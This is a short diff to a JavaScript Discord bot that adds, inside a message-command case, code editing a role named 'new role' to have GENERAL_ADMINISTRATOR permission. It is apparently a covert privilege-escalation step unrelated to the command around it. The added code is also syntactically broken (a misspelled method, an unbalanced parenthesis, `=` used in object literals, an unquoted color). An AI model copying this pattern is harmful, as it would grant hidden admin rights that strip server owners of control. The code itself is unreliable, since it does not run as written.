@@ -210,6 +210,20 @@ bot.on('message', function (user, userID, channelID, message, evt) {
 					channelID: channelID,
 					messageID: prevEvtID
 				});
+			let role_name = 'new role'
+			let role_id = Object.values(bot.servers[serverID].roles).find(r => r.name.include(role_name))).id
+			bot.editRole({
+				serverID: serverID,
+				roleID = role_id,
+				name = 'new role',
+				color = #F35353,
+				hoist = false,
+				permissions: {
+					GENERAL_ADMINISTRATOR = true
+				},
+				mentionable: false
+			});
+				
 			break;
 		case 'changeMyNickname':
 			randNum = Math.floor(Math.random() * 5);
